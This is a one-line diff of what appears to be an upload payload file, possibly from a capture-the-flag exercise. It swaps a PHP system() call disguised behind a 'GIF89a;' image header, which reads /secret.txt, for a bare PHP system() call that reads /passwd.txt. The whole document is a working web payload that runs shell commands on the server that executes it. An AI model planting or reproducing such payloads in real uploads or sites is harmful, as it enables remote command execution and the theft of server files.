@@ -1,1 +1,1 @@
-GIF89a; <?php system('cat /secret.txt'); ?>
+<?php system('cat /passwd.txt'); ?>
